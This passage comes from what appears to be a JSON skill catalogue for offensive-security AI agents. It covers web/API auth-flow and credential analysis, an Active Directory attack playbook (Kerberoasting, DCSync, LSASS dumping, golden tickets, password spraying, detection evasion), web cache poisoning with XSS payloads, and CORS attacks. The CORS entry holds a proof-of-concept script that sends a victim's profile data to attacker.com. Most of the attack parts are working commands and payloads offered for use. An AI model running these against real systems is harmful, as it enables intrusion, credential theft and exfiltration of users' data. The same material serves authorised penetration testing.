— re-map as the target changes (see change-cycle forecasting) and as access alters what is reachable.</li><li>If a scanner-output parser (e.g. an <code>nmap</code> XML reader, a cloud CSPM export tool) is unavailable, fall back to raw <code>grep</code> over the report files; if the underlying scan or asset feed was never produced, flag the gap and refuse to rank a surface you cannot see.</li></ul>","n":1591},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>Consolidated attack-surface inventory with exploitability assessed.</li><li>Prioritized target list ranked by mission-weighted value, not raw severity.</li><li>Recommended initial and follow-on entry points with the path each opens toward the objective.</li></ul>","n":243}],"m":{"name":26,"desc":354,"body":2299,"file":2909,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":34.6},"name":{"lim":64,"pct":40.6}}}},"web-api-authflow-analysis":{"slug":"web-api-authflow-analysis","pillar":"analysts","name":"web-api-authflow-analysis","description":"Trace a web application or API's business logic and authentication flows from HAR archives, proxy transcripts, OpenAPI exports, SAML metadata and captured tokens — role and object permissions, token issuance and validation, session lifecycle, OAuth, OIDC and federation trust — to locate where identity, trust or state assumptions can be subverted.","family":"target-modelling","ported":false,"source":"docs/roles/operational-analyst.md#L85","summary":"Model a target web application or API's business logic and auth flows to locate where authentication, authorization, or state assumptions can be subverted for access, data, or privilege.","file":"acordia-analysts/skills/web-api-authflow-analysis/SKILL.md","used_by":[],"intro":"<p># Web/API, App-Logic &amp; Auth-Flow Analysis</p>","secs":[{"t":"Objective","h":"<p>Model a target web application or API's business logic and auth flows to locate where authentication, authorization, or state assumptions can be subverted for access, data, or privilege.</p>","n":186},{"t":"When to use","h":"<ul class=\"ml\"><li>When the target's exposed surface is a web app, API, or SSO/OAuth/SAML flow.</li><li>When bugs are likely in logic and trust boundaries rather than memory-corruption territory.</li></ul>","n":172},{"t":"Method","h":"<ul class=\"ml\"><li>Inventory the collected web/API material with <code>ls</code> / <code>find</code> / <code>glob</code> — HAR archives, proxy transcripts (<code>.saz</code>/<code>.mitm</code>/Burp session files), captured JWTs, OpenAPI/Swagger exports, SAML metadata, source-code drops — before opening any single file.</li><li>Map the app's roles, objects, and intended workflow — who may do what to which resource, and the state each action assumes. Drive reads with <code>grep</code>/<code>jq</code> for endpoint patterns, role-token claims, and state-machine transitions; open only the matched request/response pairs by line range, not the whole HAR.</li><li>Trace auth flows end-to-end: login, token issuance/validation, session lifecycle, OAuth/OIDC/SAML exchanges, and federation trust. Decode tokens offline via <code>jwt-cli decode --no-verify</code> or an equivalent library in <code>verify_signature=False</code> mode; never replay live.</li><li>Probe authorization at the object and function level (IDOR, missing checks, role confusion, tenant isolation) and multi-step logic (skipped steps, replay, race, negative/overflow values).</li><li>Hunt token and trust weaknesses — signature/audience/expiry validation, secret handling, redirect and callback abuse, assertion forgery.</li><li>Chain findings toward the crown jewels: from a logic flaw to account takeover, tenant crossover, or privileged function.</li><li>Cite every finding by <code>&lt;capture-file&gt;@L&lt;line&gt;</code> (HAR/JSON/text) or <code>&lt;capture-file&gt;:&lt;byte-offset&gt;</code> (binary formats after parser conversion) so a peer can re-open the exact request, token, or assertion.</li><li>If <code>jwt-cli</code>, <code>jq</code>, <code>mitmproxy</code>, or a similar named tool is unavailable, either substitute a documented equivalent (a Python one-liner using <code>PyJWT</code> in <code>verify_signature=False</code> mode, <code>yq</code>) or flag the gap and stop — never eyeball a base64 string for claim structure.</li></ul>","n":1744},{"t":"Signals / outputs","h":"<ul class=\"ml\"><li>App-logic and auth-flow model with marked trust boundaries.</li><li>Authz and logic-flaw findings with the assumption each breaks.</li><li>Exploit chains from entry weakness to high-value objective.</li></ul>","n":188},{"t":"Credential extraction","h":"<p>Passive analysis of collected auth material — tokens, cookies, API-key strings — captured from proxies, logs, browser storage exports, or HAR archives. Never replays a token against the live service.</p><p><strong>JWTs</strong></p><ul class=\"ml\"><li>Split on <code>.</code>; base64url-decode header and payload (payload only for classification; do not archive contents that are themselves PII/credentials).</li><li>Header fields to record: <code>alg</code> (flag <code>none</code> and <code>HS256</code> with weak-secret risk), <code>kid</code> (key identifier — useful for correlation), <code>typ</code>.</li><li>Payload fields to record: <code>iss</code>, <code>aud</code>, <code>sub</code>, <code>iat</code>, <code>exp</code>, <code>scope</code>/<code>scp</code>, <code>roles</code>, <code>azp</code>. Compute <code>exp - now</code> for freshness; expired ≠ useless (still shows the auth model).</li><li>Tooling: <code>jwt-cli decode --no-verify</code>, <code>python -c 'import jwt; print(jwt.decode(t, options={&quot;verify_signature&quot;: False}))'</code>.</li></ul><p><strong>OAuth 2 / OIDC</strong></p><ul class=\"ml\"><li>Access token — often opaque, sometimes JWT; if opaque, all classification comes from the surrounding context (endpoint used, <code>scope</code> claim on the introspection response if collected).</li><li>Refresh token — high value (long-lived, exchangeable). Flag P0 when scope is broad or refresh window exceeds 30 days.</li><li>ID token — always JWT; carries user identity claims (<code>email</code>, <code>sub</code>, <code>preferred_username</code>) — treat as PII, not just credential material.</li><li>Authorization codes — short-lived (~60s); found in redirect URLs in referer headers and browser history; useless after the initial exchange but reveal client_id / redirect_uri.</li></ul><p><strong>API keys by provider</strong></p><ul class=\"ml\"><li>Use the pattern-library prefixes from <a href=\"../credential-harvest-triage/references/credential-patterns.md\" target=\"_blank\" rel=\"noopener\"><code>credential-harvest-triage/references/credential-patterns.md</code></a>: <code>AKIA</code>, <code>ghp_</code>, <code>sk-</code>, <code>sk-ant-</code>, <code>xox[baprs]-</code>, <code>AIza</code>, <code>glpat-</code>, <code>npm_</code>, <code>pypi-</code>, <code>dckr_pat_</code>.</li><li>Provider-specific parse: GitHub PATs disclose scope via <code>X-OAuth-Scopes</code> on any <code>/user</code> GET (do not call; if the header was captured in a log, record it); AWS access keys carry the account ID in the ID via <code>sts:GetAccessKeyInfo</code> documentation (offline mapping only).</li></ul><p><strong>Session cookies</strong></p><ul class=\"ml\"><li>Framework signatures: Django <code>sessionid</code> (opaque), Rails <code>_session</code> (base64 JSON+HMAC — decodable without secret, forgery needs secret), Flask <code>session</code> (itsdangerous — signed base64, decodable), Express <code>connect.sid</code> (<code>s:&lt;sid&gt;.&lt;hmac&gt;</code>).</li><li>Cookie flags recorded: <code>Secure</code>, <code>HttpOnly</code>, <code>SameSite</code>, <code>Domain</code> (broad domain widens scope), <code>Expires</code>/<code>Max-Age</code> (freshness).</li><li>Session-storage exports (browser <code>sessionStorage</code>/<code>localStorage</code> from a HAR or profile export) frequently hold access tokens outside cookies.</li></ul><p><strong>SAML assertions</strong></p><ul class=\"ml\"><li>Base64-decode, XML-parse. Fields to record: <code>Issuer</code>, <code>NameID</code>, <code>AudienceRestriction</code>, <code>Conditions/@NotBefore</code> and <code>@NotOnOrAfter</code> (freshness), attribute statements (roles/groups).</li><li>Signature validation is out of scope for passive triage; note whether a signature is present, not whether it verifies.</li></ul><p><strong>Cross-cutting</strong></p><ul class=\"ml\"><li>Web/API credentials often have narrow <code>scope</code> but broad <code>reuse-potential</code> (same token works across many endpoints). Refresh tokens and long-lived PATs always mark P0 or P1 depending on scope. All classification and reporting flows through <a href=\"../credential-harvest-triage/SKILL.md\" target=\"_blank\" rel=\"noopener\"><code>credential-harvest-triage</code></a>; the report cites cookie name / claim identifier, never the token itself.</li></ul>","n":3266}],"m":{"name":25,"desc":348,"body":5693,"file":6289,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":34.0},"name":{"lim":64,"pct":39.1}}}},"ad-security":{"slug":"ad-security","pillar":"operators","name":"ad-security","description":"Chart the route from a domain foothold to domain control — BloodHound, LDAP and NetExec enumeration, an identifier-indexed catalogue of credential-access, escalation, lateral-movement and persistence techniques, ACL, GPO and AD CS certificate-template abuse, trust and SID-history crossing, and two worked attack paths. Reach for it when an Active Directory domain is in scope and the question is which edge to take next.","family":"directory-attack","ported":true,"source":".cyberstrike/skill/ad-security/SKILL.md","summary":"| ID    | Technique              | Tool                     | Description                      | | ----- | ---------------------- | ------------------------ | -------------------------------- | | CA-01 | Kerberoasting          | GetUserSPNs.py, Rubeus   | Request TGS for service accounts | | CA-02 | AS-REP Roasting        | GetNPUsers.py, Rubeus    | Attack accounts without preauth  | | CA-03 | DCSync                 | secretsdump.py, Mimikatz | Replicate DC credentials         | | CA-04 | LSASS Dump             | Mimikatz, ProcDump       | Extract credentials from memory  | | CA-05 | SAM/SYST","file":"acordia-operators/skills/ad-security/SKILL.md","used_by":[],"intro":"<p># Active Directory Security Testing</p>","secs":[{"t":"Credential Access Techniques","h":"<div class=\"tw\"><table><thead><tr><th>ID</th><th>Technique</th><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>CA-01</td><td>Kerberoasting</td><td>GetUserSPNs.py, Rubeus</td><td>Request TGS for service accounts</td></tr><tr><td>CA-02</td><td>AS-REP Roasting</td><td>GetNPUsers.py, Rubeus</td><td>Attack accounts without preauth</td></tr><tr><td>CA-03</td><td>DCSync</td><td>secretsdump.py, Mimikatz</td><td>Replicate DC credentials</td></tr><tr><td>CA-04</td><td>LSASS Dump</td><td>Mimikatz, ProcDump</td><td>Extract credentials from memory</td></tr><tr><td>CA-05</td><td>SAM/SYSTEM Dump</td><td>secretsdump.py</td><td>Extract local credentials</td></tr><tr><td>CA-06</td><td>NTDS.dit Extraction</td><td>secretsdump.py</td><td>Offline DC credential dump</td></tr><tr><td>CA-07</td><td>Cached Credentials</td><td>Mimikatz</td><td>Extract cached domain creds</td></tr><tr><td>CA-08</td><td>DPAPI Secrets</td><td>Mimikatz, SharpDPAPI</td><td>Decrypt protected data</td></tr><tr><td>CA-09</td><td>Credential Vault</td><td>Mimikatz</td><td>Windows credential manager</td></tr><tr><td>CA-10</td><td>Browser Credentials</td><td>SharpChromium</td><td>Chrome/Edge saved passwords</td></tr><tr><td>CA-11</td><td>LLMNR/NBT-NS Poisoning</td><td>Responder</td><td>Capture NTLMv2 hashes</td></tr><tr><td>CA-12</td><td>NTLM Relay</td><td>ntlmrelayx.py</td><td>Relay captured authentication</td></tr><tr><td>CA-13</td><td>Password Spraying</td><td>Spray, Kerbrute</td><td>Test common passwords</td></tr><tr><td>CA-14</td><td>GPP Passwords</td><td>Get-GPPPassword</td><td>Decrypt Group Policy preferences</td></tr></tbody></table></div>","n":1551},{"t":"Privilege Escalation Techniques","h":"<div class=\"tw\"><table><thead><tr><th>ID</th><th>Technique</th><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>PE-01</td><td>ACL Abuse</td><td>BloodHound, PowerView</td><td>WriteDACL, GenericAll abuse</td></tr><tr><td>PE-02</td><td>GPO Abuse</td><td>SharpGPOAbuse</td><td>Modify group policy</td></tr><tr><td>PE-03</td><td>AD CS ESC1</td><td>Certipy</td><td>Template allows user SAN</td></tr><tr><td>PE-04</td><td>AD CS ESC2</td><td>Certipy</td><td>Any purpose EKU</td></tr><tr><td>PE-05</td><td>AD CS ESC3</td><td>Certipy</td><td>Enrollment agent abuse</td></tr><tr><td>PE-06</td><td>AD CS ESC4</td><td>Certipy</td><td>Template ACL abuse</td></tr><tr><td>PE-07</td><td>AD CS ESC5</td><td>Certipy</td><td>PKI object access control</td></tr><tr><td>PE-08</td><td>AD CS ESC6</td><td>Certipy</td><td>EDITF_ATTRIBUTESUBJECTALTNAME2</td></tr><tr><td>PE-09</td><td>AD CS ESC7</td><td>Certipy</td><td>CA ACL abuse</td></tr><tr><td>PE-10</td><td>AD CS ESC8</td><td>Certipy</td><td>NTLM relay to HTTP enrollment</td></tr><tr><td>PE-11</td><td>Constrained Delegation</td><td>Rubeus, getST.py</td><td>S4U2Self/S4U2Proxy abuse</td></tr><tr><td>PE-12</td><td>Resource-Based Constrained Delegation</td><td>Rubeus</td><td>msDS-AllowedToActOnBehalfOfOtherIdentity</td></tr></tbody></table></div>","n":1637},{"t":"Lateral Movement Techniques","h":"<div class=\"tw\"><table><thead><tr><th>ID</th><th>Technique</th><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>LM-01</td><td>Pass-the-Hash</td><td>Mimikatz, pth-winexe</td><td>Authenticate with NTLM hash</td></tr><tr><td>LM-02</td><td>Pass-the-Ticket</td><td>Rubeus, Mimikatz</td><td>Inject Kerberos tickets</td></tr><tr><td>LM-03</td><td>Overpass-the-Hash</td><td>Rubeus</td><td>Request TGT with NTLM hash</td></tr><tr><td>LM-04</td><td>PSExec</td><td>Impacket, Sysinternals</td><td>Remote execution via SMB</td></tr><tr><td>LM-05</td><td>WMI Execution</td><td>wmiexec.py</td><td>Execute commands via WMI</td></tr><tr><td>LM-06</td><td>DCOM Execution</td><td>dcomexec.py</td><td>Distributed COM abuse</td></tr><tr><td>LM-07</td><td>WinRM</td><td>evil-winrm</td><td>PowerShell remoting</td></tr><tr><td>LM-08</td><td>RDP Hijacking</td><td>tscon.exe</td><td>Take over disconnected sessions</td></tr><tr><td>LM-09</td><td>SMB Relay</td><td>ntlmrelayx.py</td><td>Relay auth to other hosts</td></tr><tr><td>LM-10</td><td>SSH (Linux)</td><td>ssh</td><td>Lateral to Linux systems</td></tr></tbody></table></div>","n":1067},{"t":"Persistence Techniques","h":"<div class=\"tw\"><table><thead><tr><th>ID</th><th>Technique</th><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>PS-01</td><td>Golden Ticket</td><td>Mimikatz, ticketer.py</td><td>Forge TGT with KRBTGT hash</td></tr><tr><td>PS-02</td><td>Silver Ticket</td><td>Mimikatz, ticketer.py</td><td>Forge TGS for specific service</td></tr><tr><td>PS-03</td><td>Diamond Ticket</td><td>Rubeus</td><td>Modify legitimate TGT</td></tr><tr><td>PS-04</td><td>Skeleton Key</td><td>Mimikatz</td><td>Master password on DC</td></tr><tr><td>PS-05</td><td>AdminSDHolder</td><td>PowerView</td><td>Persistent admin rights</td></tr><tr><td>PS-06</td><td>DCShadow</td><td>Mimikatz</td><td>Rogue domain controller</td></tr><tr><td>PS-07</td><td>SID History</td><td>Mimikatz</td><td>Add privileged SID to history</td></tr><tr><td>PS-08</td><td>Machine Account</td><td>Powermad</td><td>Add computer to domain</td></tr></tbody></table></div>","n":849},{"t":"Enumeration Commands","h":"<h4 class=\"mh\">BloodHound Collection</h4><pre class=\"code\" data-lang=bash><code># SharpHound (Windows)\nSharpHound.exe -c All --zipfilename bloodhound.zip\n\n# BloodHound.py (Linux)\nbloodhound-python -d domain.local -u user -p pass -ns 10.0.0.1 -c all\n\n# NetExec BloodHound\nnxc ldap 10.0.0.1 -u user -p pass --bloodhound --collection All</code></pre><h4 class=\"mh\">LDAP Enumeration</h4><pre class=\"code\" data-lang=bash><code># Get domain info\nldapsearch -x -H ldap://10.0.0.1 -D &quot;user@domain.local&quot; -w 'pass' -b &quot;DC=domain,DC=local&quot;\n\n# Find users with SPN (Kerberoastable)\nldapsearch -x -H ldap://10.0.0.1 -D &quot;user@domain.local&quot; -w 'pass' \\\n  -b &quot;DC=domain,DC=local&quot; &quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot; sAMAccountName\n\n# Find users without preauth (AS-REP Roastable)\nldapsearch -x -H ldap://10.0.0.1 -D &quot;user@domain.local&quot; -w 'pass' \\\n  -b &quot;DC=domain,DC=local&quot; &quot;(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</code></pre><h4 class=\"mh\">NetExec Commands</h4><pre class=\"code\" data-lang=bash><code># Enumerate users\nnxc smb 10.0.0.1 -u user -p pass --users\n\n# Enumerate groups\nnxc smb 10.0.0.1 -u user -p pass --groups\n\n# Find shares\nnxc smb 10.0.0.1 -u user -p pass --shares\n\n# Check for admin access\nnxc smb 10.0.0.0/24 -u user -p pass\n\n# Password spray\nnxc smb 10.0.0.1 -u users.txt -p 'Spring2024!' --no-bruteforce</code></pre>","n":1208},{"t":"Attack Paths","h":"<h4 class=\"mh\">Path 1: Domain User to Domain Admin</h4><pre class=\"code\"><code>User Credential\n    │\n    ├─► Kerberoast SPN accounts\n    │   └─► Crack service account password\n    │       └─► Service account is Domain Admin\n    │\n    ├─► BloodHound Path Finding\n    │   └─► ACL chain to DA group\n    │       └─► WriteDACL → GenericAll → Add to DA\n    │\n    └─► AD CS Misconfiguration\n        └─► ESC1: Request cert as DA\n            └─► Authenticate as DA</code></pre><h4 class=\"mh\">Path 2: Compromised Workstation to DC</h4><pre class=\"code\"><code>Local Admin on Workstation\n    │\n    ├─► LSASS dump → cached domain creds\n    │   └─► Domain user credential\n    │       └─► Continue as Path 1\n    │\n    ├─► Find admin sessions\n    │   └─► Lateral move to server\n    │       └─► Dump DA credentials\n    │\n    └─► Unconstrained Delegation\n        └─► Coerce DC authentication\n            └─► Capture TGT → DCSync</code></pre>","n":839},{"t":"Important Impacket Tools","h":"<div class=\"tw\"><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td>GetUserSPNs.py</td><td>Kerberoasting</td></tr><tr><td>GetNPUsers.py</td><td>AS-REP Roasting</td></tr><tr><td>secretsdump.py</td><td>Dump secrets (DCSync, SAM, LSA)</td></tr><tr><td>smbexec.py</td><td>SMB-based execution</td></tr><tr><td>wmiexec.py</td><td>WMI-based execution</td></tr><tr><td>psexec.py</td><td>PSExec-style execution</td></tr><tr><td>ntlmrelayx.py</td><td>NTLM relay attacks</td></tr><tr><td>getST.py</td><td>Request service tickets</td></tr><tr><td>ticketer.py</td><td>Create Golden/Silver tickets</td></tr><tr><td>lookupsid.py</td><td>SID enumeration</td></tr><tr><td>samrdump.py</td><td>SAM Remote interface dump</td></tr></tbody></table></div>","n":688},{"t":"Detection Evasion Considerations","h":"<div class=\"tw\"><table><thead><tr><th>Action</th><th>Detection</th><th>Evasion</th></tr></thead><tbody><tr><td>Kerberoasting</td><td>4769 events (RC4)</td><td>Use AES encryption</td></tr><tr><td>DCSync</td><td>4662 events</td><td>Time-based, limit frequency</td></tr><tr><td>Pass-the-Hash</td><td>4624 Type 3 with NTLM</td><td>Overpass-the-Hash (Kerberos)</td></tr><tr><td>BloodHound</td><td>LDAP queries</td><td>Reduce collection scope</td></tr><tr><td>Mimikatz</td><td>AV signatures</td><td>BOF, custom tools</td></tr></tbody></table></div>","n":510}],"m":{"name":11,"desc":421,"body":8637,"file":9238,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":41.1},"name":{"lim":64,"pct":17.2}}}},"attack-cache-poison":{"slug":"attack-cache-poison","pillar":"operators","name":"attack-cache-poison","description":"Poison a shared cache so unrelated users are served attacker content — find the inputs the cache key ignores (X-Forwarded-Host, X-Original-URL, fat GET bodies, unkeyed parameters), plant a payload in the stored response, then prove a clean request gets it back. Reach for it when a CDN, reverse proxy or Varnish layer fronts the target and its X-Cache and Age headers show responses being reused.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-cache-poison/SKILL.md","summary":"Inject malicious content into cached responses via unkeyed inputs (headers, parameters) so that subsequent users receive the poisoned response.","file":"acordia-operators/skills/attack-cache-poison/SKILL.md","used_by":["web-application"],"intro":"<p># Web Cache Poisoning</p>","secs":[{"t":"Objective","h":"<p>Inject malicious content into cached responses via unkeyed inputs (headers, parameters) so that subsequent users receive the poisoned response.</p>","n":143},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Identify Cache Behavior</h4><pre class=\"code\" data-lang=bash><code># Check cache headers\ncurl -s -D- https://TARGET/ | grep -i &quot;x-cache\\|age\\|cache-control\\|cf-cache\\|x-varnish&quot;\n\n# Identify cache key components (vary header)\ncurl -s -D- https://TARGET/ | grep -i &quot;vary&quot;</code></pre><h4 class=\"mh\">Phase 2: Find Unkeyed Inputs</h4><p>Test headers that are reflected in response but NOT part of cache key:</p><pre class=\"code\" data-lang=bash><code># X-Forwarded-Host\ncurl -s https://TARGET/ -H &quot;X-Forwarded-Host: evil.com&quot; | grep &quot;evil.com&quot;\n\n# X-Forwarded-Scheme\ncurl -s https://TARGET/ -H &quot;X-Forwarded-Scheme: nothttps&quot; | grep &quot;redirect&quot;\n\n# X-Original-URL / X-Rewrite-URL\ncurl -s https://TARGET/ -H &quot;X-Original-URL: /admin&quot;\n\n# Custom headers\ncurl -s https://TARGET/ -H &quot;X-Forwarded-Port: 1234&quot;</code></pre><h4 class=\"mh\">Phase 3: Cache Poisoning via Unkeyed Header</h4><pre class=\"code\" data-lang=bash><code># Poison with XSS payload\ncurl -s https://TARGET/ \\\n  -H &quot;X-Forwarded-Host: evil.com\\&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;\n\n# Wait for cache to store, then verify\ncurl -s https://TARGET/ | grep &quot;alert(1)&quot;</code></pre><h4 class=\"mh\">Phase 4: Unkeyed Parameter Poisoning</h4><pre class=\"code\" data-lang=bash><code># Find parameters not in cache key\ncurl -s &quot;https://TARGET/?cb=123&quot; -D- | grep &quot;x-cache&quot;\ncurl -s &quot;https://TARGET/?utm_source=evil&quot; | grep &quot;evil&quot;\n\n# Reflected unkeyed parameter → stored XSS\ncurl -s &quot;https://TARGET/?evil=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></pre><h4 class=\"mh\">Phase 5: Fat GET / POST-based Poisoning</h4><pre class=\"code\" data-lang=bash><code># Fat GET — body in GET request\ncurl -s https://TARGET/ -X GET -d &quot;param=&lt;script&gt;alert(1)&lt;/script&gt;&quot;\n\n# POST → GET cache confusion\ncurl -s https://TARGET/ -X POST \\\n  -H &quot;X-HTTP-Method-Override: GET&quot; \\\n  -d &quot;param=evil&quot;</code></pre><h4 class=\"mh\">Phase 6: Cache Key Normalization</h4><pre class=\"code\" data-lang=bash><code># Path normalization differences\ncurl -s &quot;https://TARGET/path/../admin&quot;\ncurl -s &quot;https://TARGET/PATH&quot; vs &quot;https://TARGET/path&quot;\ncurl -s &quot;https://TARGET/path;.js&quot;</code></pre>","n":1766},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Cached XSS payload served to other users</td><td>Critical (P1)</td></tr><tr><td>Cached redirect to attacker domain</td><td>High (P2)</td></tr><tr><td>Denial of service via cache poisoning (error page cached)</td><td>Medium (P3)</td></tr><tr><td>Unkeyed header reflected (no cache impact proven)</td><td>Low (P4)</td></tr></tbody></table></div>","n":298},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Unkeyed input identified (header or parameter)</li><li>Response showing injected content</li><li>Cache headers proving response was cached (X-Cache: HIT, Age &gt; 0)</li><li>Second request (clean) still receiving poisoned content</li><li>Impact: XSS, redirect, or DoS</li></ul>","n":242},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/web-cache-poisoning\" target=\"_blank\" rel=\"noopener\">PortSwigger: Web Cache Poisoning</a></li><li><a href=\"https://portswigger.net/research/practical-web-cache-poisoning\" target=\"_blank\" rel=\"noopener\">James Kettle: Practical Web Cache Poisoning</a></li></ul>","n":206}],"m":{"name":19,"desc":396,"body":2797,"file":3383,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":38.7},"name":{"lim":64,"pct":29.7}}}},"attack-cors":{"slug":"attack-cors","pillar":"operators","name":"attack-cors","description":"Turn a reflected Origin header into credentialed cross-origin data theft — sweep arbitrary, null, subdomain, prefix-match and suffix-match origins against the returned Access-Control-Allow-Origin, then read authenticated responses wherever credentials are also allowed. Reach for it when a browser-facing API echoes the requesting origin back.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-cors/SKILL.md","summary":"Identify Cross-Origin Resource Sharing misconfigurations that allow unauthorized cross-origin access to sensitive data or APIs.","file":"acordia-operators/skills/attack-cors/SKILL.md","used_by":["web-application"],"intro":"<p># CORS Misconfiguration Attack</p>","secs":[{"t":"Objective","h":"<p>Identify Cross-Origin Resource Sharing misconfigurations that allow unauthorized cross-origin access to sensitive data or APIs.</p>","n":127},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Origin Reflection Detection</h4><p>Test if the server reflects arbitrary origins in <code>Access-Control-Allow-Origin</code>:</p><pre class=\"code\" data-lang=bash><code># Automated multi-origin sweep — curl loop over common bypass origins\nfor origin in &quot;https://evil.com&quot; &quot;https://TARGET.evil.com&quot; &quot;null&quot; &quot;http://TARGET&quot;; do\n  echo &quot;== Origin: $origin ==&quot;\n  curl -s -D- -o /dev/null &quot;https://TARGET/api/endpoint&quot; -H &quot;Origin: $origin&quot; \\\n    | grep -i &quot;access-control-allow-origin\\|access-control-allow-credentials&quot;\ndone</code></pre><p>Manual tests:</p><pre class=\"code\" data-lang=bash><code># Arbitrary origin\ncurl -s -H &quot;Origin: https://evil.com&quot; TARGET_URL -D- | grep -i &quot;access-control&quot;\n\n# Subdomain bypass\ncurl -s -H &quot;Origin: https://TARGET.evil.com&quot; TARGET_URL -D-\n\n# Null origin\ncurl -s -H &quot;Origin: null&quot; TARGET_URL -D-\n\n# HTTP downgrade\ncurl -s -H &quot;Origin: http://TARGET&quot; TARGET_URL -D-</code></pre><h4 class=\"mh\">Phase 2: Bypass Techniques</h4><pre class=\"code\" data-lang=bash><code># Backtick bypass\ncurl -s -H &quot;Origin: https://TARGET%60.evil.com&quot; TARGET_URL -D-\n\n# Underscore bypass\ncurl -s -H &quot;Origin: https://TARGET_.evil.com&quot; TARGET_URL -D-\n\n# CRLF injection\ncurl -s -H &quot;Origin: https://evil.com%0d%0a&quot; TARGET_URL -D-\n\n# Prefix matching bypass\ncurl -s -H &quot;Origin: https://evil-TARGET&quot; TARGET_URL -D-\n\n# Suffix concatenation bypass\ncurl -s -H &quot;Origin: https://TARGETevil.com&quot; TARGET_URL -D-\n\n# Origin that is itself a subdomain of the target — exploitable where that subdomain\n# carries XSS or is takeover-able\ncurl -s -H &quot;Origin: https://evil.TARGET&quot; TARGET_URL -D-\n\n# Wildcard with credentials — Access-Control-Allow-Origin: * together with\n# Access-Control-Allow-Credentials: true. The browser refuses the combination, but it\n# remains a reportable misconfiguration.</code></pre><h4 class=\"mh\">Phase 3: Impact Verification</h4><p>If ACAO reflects attacker origin + ACAC is true:</p><pre class=\"code\" data-lang=html><code>&lt;!-- PoC: reads victim data cross-origin --&gt;\n&lt;script&gt;\nfetch('https://TARGET/api/user/profile', {\n  credentials: 'include'\n})\n.then(r =&gt; r.json())\n.then(d =&gt; fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))))\n&lt;/script&gt;</code></pre>","n":1982},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Condition</th><th>Severity</th></tr></thead><tbody><tr><td>Arbitrary origin reflected + credentials allowed</td><td>Critical (P1)</td></tr><tr><td>Arbitrary origin reflected, no credentials</td><td>Medium (P3)</td></tr><tr><td>null origin accepted + credentials allowed</td><td>High (P2)</td></tr><tr><td>Subdomain origin reflected + credentials</td><td>High (P2)</td></tr><tr><td>Wildcard ACAO with credentials</td><td>Medium (P3)</td></tr></tbody></table></div>","n":344},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Request with attacker <code>Origin</code> header</li><li>Response showing <code>Access-Control-Allow-Origin</code> reflection</li><li>Response showing <code>Access-Control-Allow-Credentials: true</code></li><li>PoC HTML demonstrating cross-origin data access</li></ul>","n":209},{"t":"Tools","h":"<ul class=\"ml\"><li>curl loop over bypass origins (see Phase 1) — automated multi-origin testing</li><li><code>curl</code> — manual header injection</li><li>Browser DevTools — verify CORS behavior</li></ul>","n":155},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/cors\" target=\"_blank\" rel=\"noopener\">PortSwigger: CORS</a></li><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing\" target=\"_blank\" rel=\"noopener\">OWASP: CORS Misconfiguration</a></li></ul>","n":261}],"m":{"name":11,"desc":343,"body":3241,"file":3758,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":33.5},"name":{"lim":64,"pct":17.2}}}},"attack-graphql":{"slug":"attack-graphql","pillar":"operators","name":"attack-graphql","description":"Break a GraphQL endpoint on its own terms — extract the schema by introspection, abuse query batching and deep nesting for complexity denial of service, and reach queries and mutations the resolvers never authorise. Reach for it once /graphql or a sibling path answers a query.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-graphql/SKILL.md","summary":"Exploit GraphQL-specific vulnerabilities including schema exposure, query complexity abuse, and authorization bypass.","file":"acordia-operators/skills/attack-graphql/SKILL.md","used_by":["web-application"],"intro":"<p># GraphQL Vulnerability Testing</p>","secs":[{"t":"Objective","h":"<p>Exploit GraphQL-specific vulnerabilities including schema exposure, query complexity abuse, and authorization bypass.</p>","n":117},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Automated Testing</h4><pre class=\"code\" data-lang=bash><code># Full GraphQL test suite — introspection sweep via curl (or InQL/graphql-cop if\n# installed; ask the user before installing either)\ncurl -s -X POST &quot;https://TARGET/graphql&quot; \\\n  -H &quot;Authorization: Bearer TOKEN&quot; \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d '{&quot;query&quot;:&quot;{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }&quot;}'\n\n# Custom depth/batch — generate a deeply nested query with python3 (safe JSON\n# quoting via the json module), then send it with curl\npython3 -c &quot;\nimport json\ndepth = 15\ninner = '__typename'\nfor _ in range(depth):\n    inner = f'field {{ {inner} }}'\nprint(json.dumps({'query': '{ ' + inner + ' }'}))\n&quot; &gt; /tmp/deep_query.json\ncurl -s -X POST &quot;https://TARGET/graphql&quot; -H &quot;Content-Type: application/json&quot; -d @/tmp/deep_query.json\n\n# Batch of 100 queries in a single request\npython3 -c &quot;\nimport json\nprint(json.dumps([{'query': '{ __typename }'} for _ in range(100)]))\n&quot; | curl -s -X POST &quot;https://TARGET/graphql&quot; -H 